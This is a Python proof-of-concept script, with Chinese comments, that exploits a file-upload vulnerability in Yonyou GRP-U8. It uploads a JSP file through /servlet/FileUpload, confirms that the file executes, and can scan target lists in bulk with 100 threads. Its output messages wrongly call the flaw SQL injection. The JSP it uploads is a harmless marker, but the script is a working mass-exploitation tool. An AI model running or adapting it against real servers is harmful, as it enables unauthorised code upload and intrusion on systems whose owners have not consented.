#用友GRP-U8 FileUpload 文件上传漏洞
#/servlet/FileUpload?fileName=test.jsp&actionID=update
# 导包
import requests,sys,argparse,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错
# 指纹模块
def banner():
    banner = """
           ███████╗██╗  ██╗██╗   ██╗ █████╗ ██╗███╗   ██╗██╗   ██╗███████╗
            ██╔════╝██║  ██║██║   ██║██╔══██╗██║████╗  ██║╚██╗ ██╔╝██╔════╝
            ███████╗███████║██║   ██║███████║██║██╔██╗ ██║ ╚████╔╝ ███████╗
            ╚════██║██╔══██║██║   ██║██╔══██║██║██║╚██╗██║  ╚██╔╝  ╚════██║
            ███████║██║  ██║╚██████╔╝██║  ██║██║██║ ╚████║   ██║   ███████║
            ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝
                                                               
                                                                    version:1.0.0
"""
    print(banner)

# poc模块
def poc(target):
    payload_url ="/servlet/FileUpload?fileName=test.jsp&actionID=update"
    url = target+payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
        'Content-Length':'51',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Connection':'close',
    }
    headers2 = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
        'Accept-Encoding':'gzip',
    }
    data ='<% out.println(""This page has a vulnerability!"");%>'
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
        res2 = requests.get(url=target+'/R9iPortal/upload/test.jsp',headers=headers2,verify=False,timeout=5)
        if  res.status_code == 200 :
            if 'vulnerability' in res2.text:
                print("[+]该站点存在sql注入漏洞,url:"+target)
                with open ('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
            else :
                print("[-]该站点不存在sql注入漏洞 ,url:"+target)
                with open ('without-bug.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")       
    except Exception as e:
        print("[!]连接出现问题，请手动进行测试该站点,url="+target+str(e))
        with open ('warning.txt','a',encoding='utf-8') as fp:
            fp.write(target+"\n")

# 主函数模块
def main():
    # 先调用指纹
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="this is a 用友GRP-U8 FileUpload 文件上传漏洞")
    # -u指定单个url检测， -f指定批量url进行检测
    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
    # 调用
    args = parser.parse_args()
    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
# 主函数入口
if __name__ == "__main__":
    main()